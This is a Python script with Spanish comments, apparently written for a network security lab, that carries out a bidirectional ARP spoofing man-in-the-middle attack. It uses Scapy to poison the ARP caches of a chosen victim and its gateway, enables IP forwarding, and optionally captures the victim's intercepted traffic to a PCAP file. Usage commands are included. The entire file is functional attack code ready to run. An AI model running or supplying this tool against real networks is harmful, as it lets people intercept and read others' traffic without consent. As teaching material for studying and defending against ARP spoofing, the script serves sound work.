#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         ATAQUE MAN-IN-THE-MIDDLE MEDIANTE ARP SPOOFING          ║
║         Seguridad de Redes — Laboratorio #2                     ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Realiza un ataque ARP Spoofing bidireccional para posicionarse
    como intermediario (MitM) entre una víctima y su gateway.
    Activa IP forwarding para mantener la conectividad de la víctima
    y permitir la captura/modificación del tráfico interceptado.

Requisitos:
    pip install scapy
    sudo sysctl -w net.ipv4.ip_forward=1  (automático con -f)
    Ejecutar como root

Uso:
    sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10 -g 192.168.1.1
    sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10 -g 192.168.1.1 -s -o captura.pcap
"""

import argparse
import os
import signal
import sys
import time
from threading import Thread, Event

try:
    from scapy.all import (
        ARP, Ether, srp, sendp, sniff, wrpcap,
        get_if_hwaddr, conf
    )
except ImportError:
    print("[!] Instalar Scapy: pip install scapy")
    sys.exit(1)


# ─── Utilidades de red ────────────────────────────────────────────────────────

def get_mac(ip: str, iface: str) -> str | None:
    """Resuelve la MAC de una IP mediante ARP request."""
    conf.verb = 0
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=iface, retry=3
    )
    if ans:
        return ans[0][1].hwsrc
    return None


def enable_ip_forward() -> None:
    """Activa el forwarding de IP en el kernel."""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("[+] IP forwarding habilitado")


def disable_ip_forward() -> None:
    """Desactiva el forwarding de IP."""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')
    print("[+] IP forwarding deshabilitado")


# ─── Núcleo del ataque ────────────────────────────────────────────────────────

def poison_arp(
    target_ip: str, target_mac: str,
    spoof_ip:  str,
    iface:     str
) -> None:
    """
    Envía un ARP Reply falso al target.
    Hace creer al target que nosotros somos spoof_ip.
    """
    pkt = Ether(dst=target_mac) / ARP(
        op=2,           # ARP Reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=get_if_hwaddr(iface)
    )
    sendp(pkt, iface=iface, verbose=0)


def restore_arp(
    target_ip:  str, target_mac:  str,
    gateway_ip: str, gateway_mac: str,
    iface:      str,
    count:      int = 5
) -> None:
    """
    Restaura las tablas ARP correctas en víctima y gateway.
    Envía ARPs legítimos para deshacer el envenenamiento.
    """
    print("\n[*] Restaurando tablas ARP...")

    # Restaurar tabla ARP de la víctima
    pkt_victim = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    # Restaurar tabla ARP del gateway
    pkt_gw = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=target_ip,
        hwsrc=target_mac
    )
    sendp([pkt_victim, pkt_gw], iface=iface, count=count, verbose=0)
    print("[+] Tablas ARP restauradas correctamente")


def attack_loop(
    victim_ip:   str, victim_mac:   str,
    gateway_ip:  str, gateway_mac:  str,
    iface:       str,
    interval:    float,
    stop_event:  Event,
    counter:     list
) -> None:
    """
    Bucle principal del ataque: envía ARPs falsos periódicamente
    a la víctima Y al gateway (ataque bidireccional).
    """
    while not stop_event.is_set():
        # Envenenar víctima: "el gateway soy yo"
        poison_arp(victim_ip, victim_mac, gateway_ip, iface)
        # Envenenar gateway: "la víctima soy yo"
        poison_arp(gateway_ip, gateway_mac, victim_ip, iface)
        counter[0] += 2
        time.sleep(interval)


def capture_traffic(
    victim_ip: str,
    gateway_ip: str,
    iface: str,
    output_file: str,
    stop_event: Event
) -> None:
    """Captura tráfico interceptado y lo guarda en PCAP."""
    packets = []

    def packet_handler(pkt):
        packets.append(pkt)
        if len(packets) % 50 == 0:
            wrpcap(output_file, packets)

    sniff(
        iface=iface,
        filter=f"host {victim_ip} and host {gateway_ip}",
        prn=packet_handler,
        store=False,
        stop_filter=lambda _: stop_event.is_set()
    )
    if packets:
        wrpcap(output_file, packets)
        print(f"\n[+] Captura guardada: {output_file} ({len(packets)} paquetes)")


def stats_printer(counter: list, stop_event: Event) -> None:
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        print(f"\r[*] ARPs enviados: {counter[0]:,} | "
              f"Tiempo: {elapsed:.0f}s | "
              f"Presiona Ctrl+C para detener", end='', flush=True)
        time.sleep(1)


# ─── Función principal ────────────────────────────────────────────────────────

def run_attack(
    iface: str,
    victim_ip: str,
    gateway_ip: str,
    interval: float,
    sniff_traffic: bool,
    output: str
) -> None:
    """Orquesta el ataque ARP MitM completo."""

    print("[*] Resolviendo MACs de los objetivos...")

    victim_mac = get_mac(victim_ip, iface)
    if not victim_mac:
        print(f"[!] No se pudo resolver MAC de {victim_ip}")
        sys.exit(1)

    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] No se pudo resolver MAC del gateway {gateway_ip}")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(iface)
    enable_ip_forward()

    print(f"""
╔══════════════════════════════════════════╗
║        ARP MitM Attack — Activo          ║
╠══════════════════════════════════════════╣
║  Interfaz     : {iface:<24} ║
║  Atacante MAC : {attacker_mac:<24} ║
║  Víctima IP   : {victim_ip:<24} ║
║  Víctima MAC  : {victim_mac:<24} ║
║  Gateway IP   : {gateway_ip:<24} ║
║  Gateway MAC  : {gateway_mac:<24} ║
║  Intervalo    : {interval}s{'':<22} ║
╚══════════════════════════════════════════╝
[!] Presiona Ctrl+C para detener y restaurar ARP
""")

    counter    = [0]
    stop_event = Event()

    # Registrar handler de señal para limpieza
    def cleanup(sig, frame):
        stop_event.set()
        time.sleep(1)
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        disable_ip_forward()
        print(f"\n[+] Total ARPs enviados: {counter[0]:,}")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    # Hilos del ataque
    threads = [
        Thread(target=attack_loop,
               args=(victim_ip, victim_mac, gateway_ip, gateway_mac,
                     iface, interval, stop_event, counter),
               daemon=True),
        Thread(target=stats_printer,
               args=(counter, stop_event),
               daemon=True)
    ]

    if sniff_traffic and output:
        threads.append(
            Thread(target=capture_traffic,
                   args=(victim_ip, gateway_ip, iface, output, stop_event),
                   daemon=True)
        )
        print(f"[+] Capturando tráfico → {output}")

    for t in threads:
        t.start()

    for t in threads:
        t.join()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Ataque MitM mediante ARP Spoofing bidireccional"
    )
    parser.add_argument('-i', '--iface',   required=True, help='Interfaz de red')
    parser.add_argument('-v', '--victim',  required=True, help='IP de la víctima')
    parser.add_argument('-g', '--gateway', required=True, help='IP del gateway')
    parser.add_argument('-t', '--interval', type=float, default=2.0,
                        help='Intervalo de reenvío ARP en segundos (default: 2)')
    parser.add_argument('-s', '--sniff', action='store_true',
                        help='Capturar tráfico interceptado')
    parser.add_argument('-o', '--output', default='captura_mitm.pcap',
                        help='Archivo de salida PCAP (default: captura_mitm.pcap)')
    return parser.parse_args()


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 arp_mitm.py ...")
        sys.exit(1)

    args = parse_args()
    run_attack(
        args.iface, args.victim, args.gateway,
        args.interval, args.sniff, args.output
    )
